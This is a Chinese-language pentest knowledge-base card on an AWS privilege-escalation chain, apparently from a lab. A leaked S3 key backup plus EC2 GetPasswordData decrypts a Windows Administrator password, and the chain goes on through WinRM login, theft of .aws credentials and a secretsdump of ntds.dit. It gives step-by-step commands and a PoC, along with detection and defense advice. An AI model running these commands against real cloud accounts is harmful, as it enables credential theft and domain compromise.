---
id: cloud-cloud-iam-s3-ssh-key-ec2-getpassworddata-windows-admin
title: S3 备份泄露 SSH 私钥 + EC2 GetPasswordData：解密 Windows 实例 Administrator 口令，登录后取实例内 .aws 凭据并导出 ntds.dit
type: scenario
domain: cloud
path: cloud/cloud-iam
technique: ec2-getpassworddata-launch-key-decrypt-windows-password
aliases:
- ec2 get-password-data
- GetPasswordData 解密
- ssh_keys_backup.zip
- AWS 启动密钥解密 Windows 密码
- WinRM 登录 EC2
- 实例 .aws credentials
tags:
- cloud
- aws
- ec2
- s3
- iam
- windows
- credential
- password
- winrm
- privilege-escalation
cve: []
severity: high
confidence: high
status: verified
created: '2026-11-13'
updated: '2026-11-13'
verification:
  verified_by: verifier-V657
  verified_at: '2026-11-13T06:36:58+08:00'
  notes: 已对照原文核对：S3 桶策略授权 ssh_keys_backup.zip、GetPasswordData 密文/明文解密、WinRM 登录、.aws 凭据与 S3 内 AD 备份均与原文一致；未实机复现，ntds.dit 来源已修正为桶内备份目录
---

## 一句话结论

当低权限 IAM 用户同时拥有对某个 S3 对象的读权限（如 `ssh_keys/ssh_keys_backup.zip`）和 `ec2:DescribeInstances`/`ec2:GetPasswordData` 权限时，攻击者可下载实例启动密钥对的私钥，用 `aws ec2 get-password-data --priv-launch-key` 在本地解密出 Windows 实例的 Administrator 明文口令，经 WinRM 登录后读取实例内 `C:\Users\admin\.aws\credentials` 获得更高权限的 AK/SK（并可从桶内 AD 备份目录下载 ntds.dit 进一步域内利用）。

## 原理

- **Windows 实例口令的加密机制**：EC2 Windows 实例创建时由 AWS 生成随机 Administrator 口令，用实例所绑定密钥对的公钥加密后保存；`ec2:GetPasswordData` 返回的是这段密文。AWS 不校验调用者是否持有私钥，只校验 IAM 权限，因此"密文 + 私钥"两半凑齐即可离线解密（RSA PKCS#1 v1.5 填充）。
- **权限组合即链路**：S3 桶策略可能为了备份目的只授权某个低权用户读取 `ssh_keys/ssh_keys_backup.zip`；ec2 策略又只授权 `GetPasswordData` 到特定实例。单看每个权限都"最小"，组合起来等价于拿到该实例的本地管理员。
- **登录后的横向**：管理员会话中往往存有 `C:\Users\<user>\.aws\credentials`（部署用长期 AK/SK），其权限通常高于入口 contractor 用户；Windows 主机还可能有 AD 备份（ntds.dit + SYSTEM），可离线 `secretsdump` 导出域内哈希。
- **为什么成立**：私钥备份放在云存储是常见运维做法；GetPasswordData 的设计目标是让运维取回口令，天然允许"有权限者解密"，一旦权限边界设计不当（低权用户可读密钥备份），机制即被滥用。

## 触发条件

- IAM 策略允许 `ec2:DescribeInstances` 与 `ec2:GetPasswordData`（对目标实例），同时允许读取存有该实例启动私钥的 S3 对象。
- 目标为 Windows EC2 实例且已设置密钥对；私钥备份真实存在且可解密（未设口令或口令可获取）。
- 实例开放 WinRM（5985/5986）或可经跳板访问，且 Administrator 口令可登录。

## 利用步骤

1. `aws sts get-caller-identity` 确认入口身份；列举 attached user policy，重点找 `ec2:GetPasswordData`、`s3:GetObject`、`s3:GetBucketPolicy`。
2. `aws s3api get-bucket-policy` 查看桶策略中被授权的对象路径（本例为 `ssh_keys/ssh_keys_backup.zip`）。
3. `aws s3 cp s3://<bucket>/ssh_keys/ssh_keys_backup.zip .` 下载并解压出启动私钥（如 `it-admin.pem`）。
4. `aws ec2 describe-instances --instance-ids <id>` 获取实例 ID、KeyName、公网 IP。
5. `aws ec2 get-password-data --instance-id <id> --priv-launch-key it-admin.pem` 得到明文的 `Administrator:<口令>`。
6. 用 WinRM 登录（`Enter-PSSession -ComputerName <ip> -Credential <cred>`），在受限 shell 中用 `Get-ChildItem/Get-Content` 读取 `C:\Users\admin\.aws\credentials`。
7. 配置新 AK/SK，`aws s3 cp s3://<bucket>/flag.txt` 读取目标；若拿到 AD 备份，下载 `ntds.dit` 与 `SYSTEM` 后 `secretsdump.py -system SYSTEM -ntds ntds.dit LOCAL` 导出域哈希。

## PoC

```bash
aws sts get-caller-identity
aws iam list-attached-user-policies --user-name contractor
aws iam get-policy-version --policy-arn <policy-arn> --version-id <v>
aws s3api get-bucket-policy --bucket hl-it-admin
aws s3 cp s3://hl-it-admin/ssh_keys/ssh_keys_backup.zip .
unzip ssh_keys_backup.zip

aws ec2 describe-instances --instance-ids <instance-id>
# 无 --priv-launch-key 时返回密文；带私钥时返回明文
aws ec2 get-password-data --instance-id <instance-id> --priv-launch-key it-admin.pem

# WinRM（Windows 客户端）
$cred = New-Object System.Management.Automation.PSCredential("Administrator", (ConvertTo-SecureString -AsPlainText -Force -String '<decrypted-password>'))
Enter-PSSession -ComputerName <ip> -Credential $cred
Get-Content C:\Users\admin\.aws\credentials
```

```bash
# 可选：AD 备份离线导出
python3 secretsdump.py -system SYSTEM -ntds ntds.dit LOCAL -outputfile out.txt
```

## 变体与关联

- 变体：私钥备份在 S3 旧版本/未清理的临时对象中（配合版本控制枚举）；或密钥对私钥被写入镜像/仓库。
- 变体：不登录 WinRM 时，也可利用实例内的 SSRF/元数据服务从其他路径取角色凭证。
- 变体：拿到 ntds.dit 后转域内 DCSync/哈希传递（见关联 AD 卡）。
- 关联：[[cloud-public-ebs-snapshot-volume-mount-credential-loot]]（同类"快照/备份恢复拿凭据"）、[[cloud-cloud-iam-lambda-env-ak-enumerate-secrets-manager]]（实例/函数环境凭据横向）、[[pentest-ad-authenticated-users-reset-sql-service-dcsync-chain]]（ntds.dit 后续利用）。

## 检测与防御

- 最小权限：S3 私钥备份只授权运维角色；`ec2:GetPasswordData` 限制到必要主体并加 `aws:SourceIp`/MFA 条件；禁止低权用户同时拥有 S3 对象读与 GetPasswordData。
- 密钥管理：不在 S3 明文存放启动私钥；使用 KMS 加密与访问审计；定期轮换密钥对与实例口令。
- 检测：CloudTrail 关注 `GetPasswordData` 异常调用（非运维时段/异常源 IP）、S3 GetObject 私钥对象下载、随后同账号的 WinRM/新 AK 使用；对实例内 `.aws` 凭据做集中管理（实例角色替代长期 AK）。
- 响应：轮换泄露的密钥对与实例/域口令，吊销实例内 AK，隔离被登录主机并审计 AD 备份暴露面。
